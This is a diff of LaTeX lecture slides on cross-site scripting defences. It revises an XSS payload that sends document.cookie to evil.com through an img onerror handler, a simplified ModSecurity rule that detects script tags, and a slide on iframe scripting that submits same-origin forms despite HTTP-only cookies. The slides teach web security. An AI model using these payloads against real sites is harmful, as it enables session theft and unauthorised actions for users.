@@ -40,7 +40,7 @@
 \end{minted}
     \item disallow the word `script'?
 \begin{minted}[fontsize=\fontsize{10}{11}]{HTML}
-<img src=x onerror="(new Image()).src=
+<img src="x"onerror="(new Image()).src=
                    'http://evil.com/' + document.cookie">
 \end{minted}
 
@@ -50,15 +50,17 @@
 
 \againframe<3>{XSSmits}
 
-\begin{frame}{web application firewall rule}
+\begin{frame}[fragile]{web application firewall rule}
 \begin{Verbatim}[fontsize=\small]
 # via coreruleset.org, simplified some
-SecRule REQUEST_COOKIES|...|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:\
-    /* "@rx (?i)<script[^>]*>[\s\S]*?" \
+SecRule REQUEST_COOKIES|...|REQUEST_FILENAME|\
+        ARGS_NAMES|ARGS|... \
+    "@rx (?i)<script[^>]*>[\s\S]*?" \
     "id:941140,phase:2,block,cpature..."
 \end{Verbatim}
 \begin{itemize}
 \item look for \verb|<script>| tags in request
+\item problem: maybe not use
 \end{itemize}
 \end{frame}
 
@@ -70,7 +72,7 @@ SecRule REQUEST_COOKIES|...|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:\
     \item ``only send cookie in HTTP''
     \item cookie is \myemph{not available to JS}
     \item eliminates obvious way of exploiting XSS
-    \item problem: \myemph<2>{JS can read webpage contents}
+    \item problem (1): \myemph<2>{JS can read webpage contents}
     \end{itemize}
 \begin{Verbatim}[fontsize=\small]
 (new Image()).src = "https://example.com/?" +
@@ -78,3 +80,18 @@ SecRule REQUEST_COOKIES|...|REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:\
 \end{Verbatim}
 \end{frame}
 
+\begin{frame}<1-2>[fragile,label=HTTPOnlyCookie]{HTTP-only cookies}
+    \begin{itemize}
+    \item problem (2): \myemph<2>{JS can automate webpages on same origin}
+    \end{itemize}
+\begin{Verbatim}[fontsize=\small]
+<iframe id='the-frame'></iframe>
+<script>
+var frame = document.getElementById('the-frame');
+frame.onload = function( {
+    frame.contentDocument.getElementById('form-field').value = ...;
+    frame.contentDocument.getElementById('form-id').submit()
+}
+frame.src = ...;
+\end{Verbatim}
+\end{frame}
